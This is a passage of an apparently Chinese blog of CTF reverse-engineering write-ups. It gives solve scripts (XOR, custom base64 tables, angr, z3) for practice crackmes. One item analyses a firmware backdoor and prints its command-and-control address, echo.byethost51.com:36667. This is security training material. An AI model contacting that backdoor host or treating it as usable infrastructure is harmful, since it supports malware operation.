class="number">23</span>,  <span class="number">72</span>,  <span class="number">66</span>,   <span class="number">1</span>,  <span class="number">64</span>,  <span class="number">77</span>,  <span class="number">12</span>,   <span class="number">2</span>, <span class="number">105</span>]</span><br><span class="line"></span><br><span class="line">v4 = <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    data[i] ^= v4</span><br><span class="line">    v4 = data[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-hello-world-go"><a href="#MRCTF2020-hello-world-go" class="headerlink" title="[MRCTF2020]hello_world_go"></a>[MRCTF2020]hello_world_go</h3><p>ida打开就看到flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211001222330183.png" alt="image-20211001222330183"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211001222354843.png" alt="image-20211001222354843"></p><h3 id="WUSTCTF2020-level3"><a href="#WUSTCTF2020-level3" class="headerlink" title="[WUSTCTF2020]level3"></a>[WUSTCTF2020]level3</h3><p>base64换表加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;</span></span><br><span class="line"></span><br><span class="line">new_table = <span class="string">&quot;TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">data = data.translate(<span class="built_in">str</span>.maketrans(new_table, old_table))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(data))</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-Cr0ssfun"><a href="#WUSTCTF2020-Cr0ssfun" class="headerlink" title="[WUSTCTF2020]Cr0ssfun"></a>[WUSTCTF2020]Cr0ssfun</h3><p>angr直接解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./Cr0ssfun&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x400000</span>+ <span class="number">0x000000000001500</span>, avoid=<span class="number">0x400000</span>+<span class="number">0x0000000000001513</span>)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-BJD-hamburger-competition"><a href="#BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="[BJDCTF2020]BJD hamburger competition"></a>[BJDCTF2020]BJD hamburger competition</h3><p>Unity写的，根据谷歌搜索到的<a target="_blank" rel="noopener" href="https://gameinstitute.qq.com/community/detail/102819">Unity游戏逆向及破解方法介绍-腾讯游戏学堂 (qq.com)</a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211001225202074.png" alt="image-20211001225202074"></p><p>我们将Assembly-CSharp.dll 拖进dnspy反编译，得到核心代码：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211001225305244.png" alt="image-20211001225305244"></p><p>丢进<a target="_blank" rel="noopener" href="http://www.ttmd5.com/hash.php?type=5">sha1在线解密 在线加密 (ttmd5.com)</a>解得1001, 根据Md5函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static string Md5(string str)</span><br><span class="line">	&#123;</span><br><span class="line">		byte[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line">		byte[] array = MD5.Create().ComputeHash(bytes);</span><br><span class="line">		StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">		foreach (byte b in array)</span><br><span class="line">		&#123;</span><br><span class="line">			stringBuilder.Append(b.ToString(&quot;X2&quot;));</span><br><span class="line">		&#125; // 转大写</span><br><span class="line">		return stringBuilder.ToString().Substring(0, 20);  // 返回前20位</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bpython version 0.20 on top of Python 3.6.9 /usr/local/bin/python3</span><br><span class="line">&gt;&gt;&gt; import hashlib</span><br><span class="line">&gt;&gt;&gt; hashlib.md5(b&quot;1001&quot;).hexdigest()</span><br><span class="line">&#x27;b8c37e33defde51cf91e1e03e51657da&#x27;</span><br><span class="line">&gt;&gt;&gt; hashlib.md5(b&quot;1001&quot;).hexdigest()[:20]</span><br><span class="line">&#x27;b8c37e33defde51cf91e&#x27;</span><br><span class="line">&gt;&gt;&gt; hashlib.md5(b&quot;1001&quot;).hexdigest()[:20].upper()</span><br><span class="line">&#x27;B8C37E33DEFDE51CF91E&#x27;</span><br></pre></td></tr></table></figure><h3 id="FlareOn6-Overlong"><a href="#FlareOn6-Overlong" class="headerlink" title="[FlareOn6]Overlong"></a>[FlareOn6]Overlong</h3><p>IDA打开后面还有东西，动调修改大小为<code>0xb0</code>出flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211001230317030.png" alt="image-20211001230317030"></p><h3 id="ACTF新生赛2020-Oruga"><a href="#ACTF新生赛2020-Oruga" class="headerlink" title="[ACTF新生赛2020]Oruga"></a>[ACTF新生赛2020]Oruga</h3><p>迷宫题，迷宫为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 23 00 00 00 00 00 00 00 23 23 23 23</span><br><span class="line">00 00 00 23 23 00 00 00 4F 4F 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 4F 4F 00 50 50 00 00 00</span><br><span class="line">00 00 00 4C 00 4F 4F 00 4F 4F 00 50 50 00 00 00</span><br><span class="line">00 00 00 4C 00 4F 4F 00 4F 4F 00 50 00 00 00 00</span><br><span class="line">00 00 4C 4C 00 4F 4F 00 00 00 00 50 00 00 00 00</span><br><span class="line">00 00 00 00 00 4F 4F 00 00 00 00 50 00 00 00 00</span><br><span class="line">23 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 23 00 00 00</span><br><span class="line">00 00 00 00 00 00 4D 4D 4D 00 00 00 23 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 4D 4D 4D 00 00 00 00 45 45</span><br><span class="line">00 00 00 30 00 4D 00 4D 00 4D 00 00 00 00 45 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 45 45</span><br><span class="line">54 54 54 49 00 4D 00 4D 00 4D 00 00 00 00 45 00</span><br><span class="line">00 54 00 49 00 4D 00 4D 00 4D 00 00 00 00 45 00</span><br><span class="line">00 54 00 49 00 4D 00 4D 00 4D 21 00 00 00 45 45</span><br></pre></td></tr></table></figure><p>到达 0x21处停止</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">W 向上</span><br><span class="line">E 向右</span><br><span class="line">M 向下</span><br><span class="line">J 向左</span><br></pre></td></tr></table></figure><p>根据可知，0可以一直移动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while ( !data[v2] )</span><br><span class="line">   &#123;</span><br><span class="line">     if ( v4 == -1 &amp;&amp; (v2 &amp; 0xF) == 0 )</span><br><span class="line">       return 0LL;</span><br><span class="line">     if ( v4 == 1 &amp;&amp; v2 % 16 == 0xF )</span><br><span class="line">       return 0LL;</span><br><span class="line">     if ( v4 == 16 &amp;&amp; (unsigned int)(v2 - 0xF0) &lt;= 0xF )</span><br><span class="line">       return 0LL;</span><br><span class="line">     if ( v4 == -16 &amp;&amp; (unsigned int)(v2 + 0xF) &lt;= 0x1E )</span><br><span class="line">       return 0LL;</span><br><span class="line">     v2 += v4;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>手动解得<code>MEWEMEWJMEWJM</code></p><h3 id="FlareOn3-Challenge1"><a href="#FlareOn3-Challenge1" class="headerlink" title="[FlareOn3]Challenge1"></a>[FlareOn3]Challenge1</h3><p>经典换表base64编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">new_table = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span></span><br><span class="line"></span><br><span class="line">data = data.translate(<span class="built_in">str</span>.maketrans(new_table, old_table))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(data))</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-basic-re"><a href="#UTCTF2020-basic-re" class="headerlink" title="[UTCTF2020]basic-re"></a>[UTCTF2020]basic-re</h3><p>看下汇编就出flag</p><h3 id="Zer0pts2020-easy-strcmp"><a href="#Zer0pts2020-easy-strcmp" class="headerlink" title="[Zer0pts2020]easy strcmp"></a>[Zer0pts2020]easy strcmp</h3><p>修改了strcmp, 实际先进行了一点操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_55E12AB7F6EA(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+18h] [rbp-8h]</span><br><span class="line">  int v4; // [rsp+18h] [rbp-8h]</span><br><span class="line">  int j; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    ;</span><br><span class="line">  v4 = (i &gt;&gt; 3) + 1;</span><br><span class="line">  for ( j = 0; j &lt; v4; ++j )</span><br><span class="line">    *(_QWORD *)(8 * j + a1) -= qword_55E12AD80060[j];</span><br><span class="line">  return qword_55E12AD80090(a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">b&quot;zer0pts&#123;********CENSORED********&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line">sub_data = [<span class="number">0x0000000000000000</span>, <span class="number">0x410A4335494A0942</span>, <span class="number">0x0B0EF2F50BE619F0</span>, <span class="number">0x4F0A3A064A35282B</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">_data = struct.unpack(<span class="string">&quot;&lt;4Q&quot;</span>, data)</span><br><span class="line"><span class="built_in">print</span>(_data)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    flag += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, (_data[i] + sub_data[i]) &amp; <span class="number">0xffffffffffffffff</span>)</span><br><span class="line"><span class="built_in">print</span>(flag + <span class="string">b&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-Universe-final-answer"><a href="#ACTF新生赛2020-Universe-final-answer" class="headerlink" title="[ACTF新生赛2020]Universe_final_answer"></a>[ACTF新生赛2020]Universe_final_answer</h3><p>z3直接解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&quot;x%d&quot;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">v1 = x[<span class="number">1</span>]</span><br><span class="line">v2 = x[<span class="number">0</span>]</span><br><span class="line">v3 = x[<span class="number">2</span>]</span><br><span class="line">v4 = x[<span class="number">3</span>]</span><br><span class="line">v5 = x[<span class="number">4</span>]</span><br><span class="line">v6 = x[<span class="number">6</span>]</span><br><span class="line">v7 = x[<span class="number">5</span>]</span><br><span class="line">v8 = x[<span class="number">7</span>]</span><br><span class="line">v9 = x[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">s.add(-<span class="number">85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + -<span class="number">45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span>)</span><br><span class="line">v11 = x[<span class="number">9</span>]</span><br><span class="line">s.add(<span class="number">30</span> * v11 + -<span class="number">70</span> * v9 + -<span class="number">122</span> * v6 + -<span class="number">81</span> * v7 + -<span class="number">66</span> * v5 + -<span class="number">115</span> * v4 + -<span class="number">41</span> * v3 + -<span class="number">86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == -<span class="number">54400</span>)</span><br><span class="line">s.add(-<span class="number">103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + -<span class="number">89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 &lt;&lt; <span class="number">6</span>) - <span class="number">120</span> * v9 == -<span class="number">10283</span>)</span><br><span class="line">s.add(<span class="number">71</span> * v6 + (v7 &lt;&lt; <span class="number">7</span>) + <span class="number">99</span> * v5 + -<span class="number">111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span>)</span><br><span class="line">s.add(<span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + -<span class="number">19</span> * v6 + <span class="number">99</span> * v7 + -<span class="number">117</span> * v5 + -<span class="number">69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == -<span class="number">2944</span>)</span><br><span class="line">s.add(-<span class="number">54</span> * v11 + -<span class="number">23</span> * v8 + -<span class="number">82</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == -<span class="number">2222</span>)</span><br><span class="line">s.add(-<span class="number">83</span> * v11 + -<span class="number">111</span> * v7 + -<span class="number">57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == -<span class="number">13258</span>)</span><br><span class="line">s.add(<span class="number">81</span> * v11 + -<span class="number">48</span> * v9 + <span class="number">66</span> * v8 + -<span class="number">104</span> * v6 + -<span class="number">121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">80</span> * v1 == -<span class="number">1559</span>)</span><br><span class="line">s.add(<span class="number">101</span> * v11 + -<span class="number">85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + -<span class="number">83</span> * v5 + -<span class="number">101</span> * v4 + <span class="number">90</span> * v3 + -<span class="number">28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span>)</span><br><span class="line">s.add(<span class="number">99</span> * v11 + -<span class="number">28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + -<span class="number">18</span> * v7 + -<span class="number">127</span> * v5 + <span class="number">6</span> * v4 + -<span class="number">9</span> * v3 + -<span class="number">93</span> * v1 + <span class="number">58</span> * v2 == -<span class="number">1697</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    s.add(x[i] &gt;= <span class="number">0x20</span>)</span><br><span class="line">    s.add(x[i] &lt;= <span class="number">0x7e</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        flag += <span class="built_in">bytes</span>([m[x[i]].as_long()])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>输入得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  tmp ./UniverseFinalAnswer</span><br><span class="line">Please give me the key string:F0uRTy_7w@</span><br><span class="line">Judgement pass! flag is actf&#123;F0uRTy_7w@_42&#125;</span><br></pre></td></tr></table></figure><h3 id="firmware"><a href="#firmware" class="headerlink" title="firmware"></a>firmware</h3><p>binwalk固件提取, 后用firmware-mod-kit分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  firmware-mod-kit-master ./unsquashfs_all.sh 120200.squashfs</span><br><span class="line">Attempting to extract SquashFS 4.X file system...</span><br><span class="line"></span><br><span class="line">Skipping squashfs-2.1-r2 (wrong version)...</span><br><span class="line">Skipping squashfs-3.0 (wrong version)...</span><br><span class="line">Skipping squashfs-3.0-lzma-damn-small-variant (wrong version)...</span><br><span class="line">Skipping others/squashfs-2.0-nb4 (wrong version)...</span><br><span class="line">Skipping others/squashfs-2.2-r2-7z (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.0-e2100 (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2 (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2-lzma (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2-lzma/squashfs3.2-r2/squashfs-tools (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2-hg612-lzma (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2-wnr1000 (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2-rtn12 (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.3 (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.3-lzma/squashfs3.3/squashfs-tools (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.3-grml-lzma/squashfs3.3/squashfs-tools (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.4-cisco (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.4-nb4 (wrong version)...</span><br><span class="line"></span><br><span class="line">Trying ./src/others/squashfs-4.2-official/unsquashfs... Parallel unsquashfs: Using 8 processors</span><br><span class="line"></span><br><span class="line">Trying ./src/others/squashfs-4.2/unsquashfs... Parallel unsquashfs: Using 8 processors</span><br><span class="line"></span><br><span class="line">Trying ./src/others/squashfs-4.0-lzma/unsquashfs-lzma... Parallel unsquashfs: Using 8 processors</span><br><span class="line">480 inodes (523 blocks) to write</span><br><span class="line"></span><br><span class="line">[=========================================================================================-              ] 454/523  86%</span><br><span class="line">created 341 files</span><br><span class="line">created 39 directories</span><br><span class="line">created 70 symlinks</span><br><span class="line">created 0 devices</span><br><span class="line">created 0 fifos</span><br><span class="line">File system sucessfully extracted!</span><br><span class="line">MKFS=&quot;./src/others/squashfs-4.0-lzma/mksquashfs-lzma&quot;</span><br></pre></td></tr></table></figure><p>提取出来后，在tmp中找到backdoor， upx解壳，开始找<code>网址:端口</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002002850232.png" alt="image-20211002002850232"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002002928087.png" alt="image-20211002002928087"></p><p>得到<code>echo.byethost51.com:36667</code></p><p>则flag:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  tmp bpython3</span><br><span class="line">bpython version 0.20 on top of Python 3.6.9 /usr/local/bin/python3</span><br><span class="line">&gt;&gt;&gt; import hashlib</span><br><span class="line">&gt;&gt;&gt; hashlib.md5(b&quot;echo.byethost51.com:36667&quot;).hexdigest()</span><br><span class="line">&#x27;33a422c45d551ac6e4756f59812a954b&#x27;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-level4"><a href="#WUSTCTF2020-level4" class="headerlink" title="[WUSTCTF2020]level4"></a>[WUSTCTF2020]level4</h3><p>根据提示，可知程序生成一个二叉树，并输出中序遍历、后序遍历。则应求先序遍历。</p><p>由已知得节点结构如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 node            struc ; (sizeof=0x18, mappedto_8)</span><br><span class="line">00000000 data            dq ? </span><br><span class="line">00000008 left            dq ?    </span><br><span class="line">00000010 right           dq ?</span><br></pre></td></tr></table></figure><p>修改一下得二叉树结构</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002010246991.png" alt="image-20211002010246991"></p><p>则解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;I&#123;_&#125;Af2700ih_secTS2Et_wr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    data = -<span class="number">1</span></span><br><span class="line">    left = -<span class="number">1</span></span><br><span class="line">    right = -<span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        self.data = data</span><br><span class="line"></span><br><span class="line">x = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    x.append(TreeNode(i))</span><br><span class="line"></span><br><span class="line">x[<span class="number">22</span>].left = <span class="number">15</span></span><br><span class="line">x[<span class="number">15</span>].left = <span class="number">20</span></span><br><span class="line">x[<span class="number">20</span>].left = <span class="number">5</span></span><br><span class="line">x[<span class="number">5</span>].left = <span class="number">6</span></span><br><span class="line">x[<span class="number">5</span>].right = <span class="number">8</span></span><br><span class="line">x[<span class="number">20</span>].right = <span class="number">18</span></span><br><span class="line">x[<span class="number">18</span>].left = <span class="number">9</span></span><br><span class="line">x[<span class="number">18</span>].right = <span class="number">1</span></span><br><span class="line">x[<span class="number">1</span>].left = <span class="number">16</span></span><br><span class="line">x[<span class="number">1</span>].right = <span class="number">11</span></span><br><span class="line">x[<span class="number">15</span>].right = <span class="number">10</span></span><br><span class="line">x[<span class="number">10</span>].left = <span class="number">13</span></span><br><span class="line">x[<span class="number">10</span>].right = <span class="number">2</span></span><br><span class="line">x[<span class="number">2</span>].left = <span class="number">0</span></span><br><span class="line">x[<span class="number">2</span>].right = <span class="number">17</span></span><br><span class="line">x[<span class="number">22</span>].right = <span class="number">21</span></span><br><span class="line">x[<span class="number">21</span>].left = <span class="number">4</span></span><br><span class="line">x[<span class="number">21</span>].right = <span class="number">12</span></span><br><span class="line">x[<span class="number">12</span>].right = <span class="number">7</span></span><br><span class="line">x[<span class="number">7</span>].left = <span class="number">23</span></span><br><span class="line">x[<span class="number">7</span>].right = <span class="number">14</span></span><br><span class="line">x[<span class="number">14</span>].left = <span class="number">19</span></span><br><span class="line">x[<span class="number">14</span>].right = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preOrder</span>(<span class="params">index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> index != -<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(x[index].data, end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">        preOrder(x[index].left)</span><br><span class="line">        preOrder(x[index].right)</span><br><span class="line"></span><br><span class="line">preOrder(<span class="number">22</span>)</span><br></pre></td></tr></table></figure><h3 id="网鼎杯-2020-青龙组-singal"><a href="#网鼎杯-2020-青龙组-singal" class="headerlink" title="[网鼎杯 2020 青龙组]singal"></a>[网鼎杯 2020 青龙组]singal</h3><p><a href="https://lantern.cool/wp-games-2020wd/">2020 网鼎杯 | Lantern’s 小站</a></p><h3 id="GUET-CTF2019-number-game"><a href="#GUET-CTF2019-number-game" class="headerlink" title="[GUET-CTF2019]number_game"></a>[GUET-CTF2019]number_game</h3><p>一个明显的5 * 5的数独游戏，用z3直接解， 得到中序遍历后的序列。</p><p>动态调试，跳过格式校验后，得到位置对应关系</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0123456789</span><br><span class="line">7381940526</span><br></pre></td></tr></table></figure><p>则逆推得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&quot;14#2330#1#0#23##3##042##1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">if</span> data[i] != <span class="number">0x23</span>:</span><br><span class="line">        s.add(x[i] == data[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s.add(x[i] &gt; <span class="number">0x2f</span>)</span><br><span class="line">        s.add(x[i] &lt;= <span class="number">0x34</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(j + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            s.add(x[<span class="number">5</span> * i + j] != x[<span class="number">5</span> * i + k])</span><br><span class="line">            s.add(x[<span class="number">5</span> * j + i] != x[<span class="number">5</span> * k + i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    _data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">        _data += <span class="built_in">bytes</span>([m[x[i]].as_long()])</span><br><span class="line">    <span class="built_in">print</span>(_data)</span><br><span class="line"></span><br><span class="line">_flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">if</span> data[i] == <span class="number">0x23</span>:</span><br><span class="line">        _flag += <span class="built_in">bytes</span>([_data[i]])</span><br><span class="line"><span class="built_in">print</span>(_flag)</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&quot;7381940526&quot;</span></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    flag[s[i] - <span class="number">0x30</span>] = _flag[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-simple-CPP"><a href="#GXYCTF2019-simple-CPP" class="headerlink" title="[GXYCTF2019]simple CPP"></a>[GXYCTF2019]simple CPP</h3><p>分为三部分</p><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>输入异或加密</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = flag;</span><br><span class="line">    <span class="keyword">if</span> ( v41 